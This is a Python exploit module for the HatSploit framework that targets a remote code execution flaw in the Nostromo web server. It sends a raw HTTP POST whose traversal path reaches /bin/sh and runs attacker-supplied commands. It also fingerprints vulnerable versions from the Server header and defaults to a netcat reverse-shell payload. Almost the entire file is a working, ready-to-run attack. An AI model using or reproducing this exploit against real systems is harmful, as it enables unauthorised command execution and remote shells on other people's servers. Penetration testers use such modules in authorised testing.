"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pex.proto.http import HTTPClient
from pex.proto.tcp import TCPClient

from hatsploit.lib.handler import Handler
from hatsploit.lib.module import Module


class HatSploitModule(Module, Handler, HTTPClient, TCPClient):
    details = {
        'Category': "exploit",
        'Name': "Nostromo Httpd Remote Code Execution",
        'Module': "exploit/linux/nostromo/remote_code_execution",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer',
            'sp0re (sp0re) - vulnerability researcher',
        ],
        'Description': "Remote Code Execution in Nostromo Httpd.",
        'Platform': "linux",
        'Rank': "high",
    }

    payload = {
        'Value': "unix/generic/netcat_reverse_tcp",
        'Architectures': None,
        'Platforms': ['linux', 'unix'],
        'Types': None,
    }

    options = {
        'HOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True,
        },
        'PORT': {
            'Description': "Remote port.",
            'Value': 80,
            'Type': "port",
            'Required': True,
        },
    }

    def exploit(self, remote_host, remote_port, command):
        payload = ""
        payload += "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n"
        payload += "Content-Length: 1\r\n\r\necho\necho\n"
        payload += f"{command} 2>&1"

        client = self.open_tcp(remote_host, remote_port)

        client.connect()
        client.send(payload.encode())

        response = client.recv(4096)
        response = response.decode()

        client.disconnect()
        response = response.split('\r\n\r\n', 1)

        if len(response) == 2:
            return response[1]

    def check(self):
        remote_host, remote_port = self.parse_options(self.options)

        response = self.http_request(
            method="HEAD", host=remote_host, port=remote_port, path="/"
        )

        if response:
            if 'Server' in response.headers:
                server = response.headers['Server']

                if int(server.split('.')[-1]) < 7:
                    return True

        return False

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.module_handle(
            host=remote_host,
            sender=self.exploit,
            args={'remote_host': remote_host, 'remote_port': remote_port},
        )
